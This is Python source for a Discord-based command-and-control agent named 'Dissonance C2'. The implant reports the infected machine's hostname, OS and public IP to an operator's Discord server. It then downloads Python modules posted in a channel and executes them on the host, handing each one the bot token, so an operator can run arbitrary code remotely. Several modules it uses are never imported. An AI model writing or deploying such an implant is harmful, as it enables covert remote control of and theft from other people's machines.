import os
import discord
import requests
import socket
import time
import platform
import asyncio

TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))
HOSTNAME = socket.gethostname()

MODULES_CATEGORY_NAME = "MODULES"
AGENTS_CATEGORY_NAME = "AGENTS"
LOGS_CATEGORY_NAME = "LOGS"
MODULES_CHANNEL_NAME = "modules"
LOGS_CHANNEL_NAME = "logs"

start_time = time.time()
refresh_lock = asyncio.Lock()
module_run_lock = asyncio.Lock()


modules = {}
modules_channel = None
agent_channel = None
logs_channel = None
panel = None

def public_ip():
    try:
        return requests.get(
            "https://api.ipify.org",
            timeout=5
        ).text
    except requests.RequestException:
        return "Unknown"

PUBLIC_IP = public_ip()
OS = platform.system()

intents = discord.Intents.default()
intents.message_content = True

bot = discord.Client(intents=intents)

 # create the embed for the panel
def embed():

    uptime = int(time.time() - start_time)

    days, uptime = divmod(uptime, 86400)
    hours, uptime = divmod(uptime, 3600)
    minutes, seconds = divmod(uptime, 60)

    e = discord.Embed(
        title="DISSONANCE",
    )

    e.add_field(
        name="🖥️ Machine",
        value=f"`{HOSTNAME}`",
        inline=True
    )

    e.add_field(
        name="💻 OS",
        value=f"`{OS}`",
        inline=True
    )

    e.add_field(
        name="🌐 Public IP",
        value=f"`{PUBLIC_IP}`",
        inline=True
    )

    e.add_field(
        name="⏱️ Uptime",
        value=f"`{days}d {hours}h {minutes}m {seconds}s`",
        inline=True
    )

    e.set_footer(
        text="Dissonance C2 • Agent Status"
    )

    return e

async def refresh_modules():
    global modules

    await send_log("Refreshing modules")

    if not modules_channel:
        await send_log("Cannot refresh modules - modules channel unavailable")
        return

    async with refresh_lock:
        new_modules = {
            attachment.filename: {
                "id": attachment.id,
                "url": attachment.url
            }
            async for message in modules_channel.history(limit=None)
            for attachment in message.attachments
            if attachment.filename.lower().endswith(".py")
        }

        modules = new_modules

    await send_log(
        f"Module refresh complete - {len(modules)} module(s) found"
    )

async def move_panel():
    global panel

    if not agent_channel:
        await send_log("Cannot move panel - agent channel unavailable")
        return

    await send_log("Moving control panel")

    if panel:
        try:
            await panel.delete()
            await send_log("Previous control panel deleted")
        except discord.NotFound:
            await send_log("Previous control panel was already deleted")
            pass

    panel = await agent_channel.send(
        embed=embed(),
        view=ModuleView()
    )
    await send_log("New control panel created")


async def run_module(name):
    module = modules.get(name)

    if not module:
        await send_log(f"Module not found: {name}")
        return

    await send_log(f"Starting module: {name}")

    async with module_run_lock:
        temp_path = None

        try:
            # Download module
            await send_log(f"Downloading module: {name}")

            response = await asyncio.to_thread(
                requests.get,
                module["url"],
                timeout=30
            )

            response.raise_for_status()

            # Create a unique temporary file
            with tempfile.NamedTemporaryFile(
                suffix=".py",
                delete=False
            ) as temp_file:
                temp_path = Path(temp_file.name)
                temp_file.write(response.content)

            await send_log(
                f"Module downloaded successfully: {name}"
            )

            # Execute module
            await send_log(
                f"Executing module: {name}"
            )

            await asyncio.to_thread(
                subprocess.run,
                [
                    sys.executable,
                    str(temp_path),
                    "--token",
                    TOKEN,
                    "--channel",
                    str(agent_channel.id),
                    "--server",
                    str(GUILD_ID),
                ],
                check=True
            )

            await send_log(
                f"Module completed successfully: {name}"
            )

        except requests.RequestException as error:
            await send_log(
                f"Module download failed: {name} - {error}"
            )

        except subprocess.CalledProcessError as error:
            await send_log(
                f"Module failed: {name} - exit code {error.returncode}"
            )

        except Exception as error:
            await send_log(
                f"Module error: {name} - {error}"
            )

        finally:
            if temp_path:
                temp_path.unlink(missing_ok=True)

            await send_log(
                f"Module execution finished: {name}"
            )

class ModuleView(discord.ui.View):

    def __init__(self):
        super().__init__(timeout=None)

        refresh_button = discord.ui.Button(
            label="Refresh",
            emoji="🔄",
            style=discord.ButtonStyle.primary,
            custom_id="panel:refresh",
        )

        async def refresh_callback(interaction):
            await interaction.response.defer()

            await send_log(
                f"Panel refresh requested by {interaction.user}"
            )

            await refresh_modules()
            await move_panel()

            await send_log("Panel refresh complete")
        
        refresh_button.callback = refresh_callback
        self.add_item(refresh_button)

        for name, info in modules.items():

            button = discord.ui.Button(
                label=name,
                style=discord.ButtonStyle.secondary,
                custom_id=f"module:{info['id']}",
            )

            async def module_callback(
                interaction,
                module_name=name,
            ):
                await interaction.response.defer()
                await run_module(module_name)

            button.callback = module_callback
            self.add_item(button)

async def send_log(text):
    await logs_channel.send(f"[{HOSTNAME}] {text}")

async def setup():
    global agent_channel, modules_channel, logs_channel, panel
    guild = bot.get_guild(GUILD_ID)

    if not guild:
        print("[!] Guild not found")
        exit()

    # Find the existing AGENTS category
    category = discord.utils.get(
        guild.categories,
        name=AGENTS_CATEGORY_NAME
    )

    if not category:
        print("[!] AGENTS Category not found")
        exit()

    # Find this agent's channel inside AGENTS
    agent_channel = discord.utils.get(
        category.text_channels,
        name=HOSTNAME
    )

    modules_category = discord.utils.get(
        guild.categories,
        name=MODULES_CATEGORY_NAME
    )

    if not modules_category:
        print("[!] MODULES Category not found")
        exit()

    modules_channel = discord.utils.get(
        modules_category.text_channels,
        name=MODULES_CHANNEL_NAME
    )

    if not modules_channel:
        print("[!] Modules Channel not found")
        exit()
    

    logs_category = discord.utils.get(
        guild.categories,
        name=LOGS_CATEGORY_NAME
    )

    if not logs_category:
        print("[!] LOGS Category not found")
        exit()

    logs_channel = discord.utils.get(
        logs_category.text_channels,
        name=LOGS_CHANNEL_NAME
    )

    if not logs_channel:
        print("[!] Modules Channel not found")
        exit()

    await send_log("Agent connected to Discord")
    await send_log("Guild successfully located")
    await send_log("AGENTS category located")
    await send_log("MODULES category located")
    await send_log("Modules channel located")
    await send_log("LOGS category located")
    await send_log("Logs channel located")
    

    # Create the channel if it doesn't exist
    if not agent_channel:
        await send_log("Agents channel not found - creating it!")

        print("[!] AGENTS Channel not found")

        agent_channel = await guild.create_text_channel(
            HOSTNAME,
            category=category
        )
        await send_log("Agent channel created")
        print(f"[+] AGENTS Channel created: #{HOSTNAME}")

    else:
        await send_log("Agent channel found")
        print(f"[+] AGENTS Channel found: #{HOSTNAME}")

    # Create the panel
    await send_log("sending control panel to Agent channel")
    panel = await agent_channel.send(
        embed=embed(),
        view=ModuleView()
    )


@bot.event
async def on_ready():
    print(f"Connected as {bot.user}")
    await setup()




bot.run(TOKEN)